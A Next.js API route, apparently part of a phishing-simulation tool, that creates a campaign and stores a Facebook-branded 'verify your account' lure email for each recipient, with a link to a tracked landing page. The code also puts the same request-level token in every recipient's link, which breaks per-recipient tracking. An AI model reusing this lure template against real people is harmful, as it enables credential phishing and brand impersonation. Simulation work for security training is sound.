//api/send-campaign/route.ts
import { NextResponse } from "next/server"
import { createClient } from "@supabase/supabase-js"

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
)
const domainMap: Record<string, string> = {
  sawaddee: process.env.SAWADDEE_DOMAIN!,
  welcom: process.env.WELCOM_DOMAIN!,
};


export async function POST(req: Request) {
  const { name, landing_type } = await req.json()
  const baseUrl = domainMap[landing_type];
  const token = crypto.randomUUID();
  const link = `${baseUrl}/account-review/${landing_type}?session=${token}`;
  if (!domainMap[landing_type]) {
    return NextResponse.json({ error: "Invalid landing" }, { status: 400 });
  }
  // 1. Create campaign
  const { data: campaign, error: campaignError } = await supabase
    .from("campaigns")
    .insert({ name })
    .select()
    .single()

  if (campaignError) {
    return NextResponse.json({ error: campaignError.message }, { status: 500 })
  }

  // 2. Get recipients
  const { data: recipients } = await supabase
    .from("recipients")
    .select("*")

  // 3. Loop to create targets and emails
  for (const r of recipients ?? []) {
    const token = crypto.randomUUID()

    const { data: target, error: targetError } = await supabase
      .from("campaign_targets")
      .insert({
        campaign_id: campaign.id,
        recipient_id: r.id,
        token,
        landing_type,
      })
      .select()
      .single()

    if (targetError) continue

    // Create fake email
    await supabase.from("fake_emails").insert({
      campaign_target_id: target.id,
      subject: "Action Required: Account Verification",
      body_html: `
        <div style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
          <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <div style="background-color: #0056b3; padding: 20px; text-align: center;">
              <h2 style="color: #ffffff; margin: 0; font-size: 24px;">Account Notification</h2>
            </div>
            <div style="padding: 30px; color: #333333;">
              <p style="font-size: 16px; margin-bottom: 20px;">Hello,</p>
              <p style="font-size: 16px; line-height: 1.5; margin-bottom: 20px;">
                We have detected a new sign-in attempt. Please verify your identity immediately.
              </p>
              <div style="text-align: center; margin: 30px 0;">
                <a href="${link}" 
                   style="background-color: #007bff; color: #ffffff; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 16px; display: inline-block;">
                  Verify Account Now
                </a>
              </div>
              <p style="font-size: 14px; color: #666666; margin-top: 20px;">
                If you did not request this, please verify your account immediately.
              </p>
            </div>
            <div style="background-color: #eeeeee; padding: 15px; text-align: center; font-size: 12px; color: #888888;">
              <p style="margin: 0;">© 2026 Facebook. All rights reserved.</p>
            </div>
          </div>
        </div>
      `,
    })
  }

  return NextResponse.json({ success: true })
}
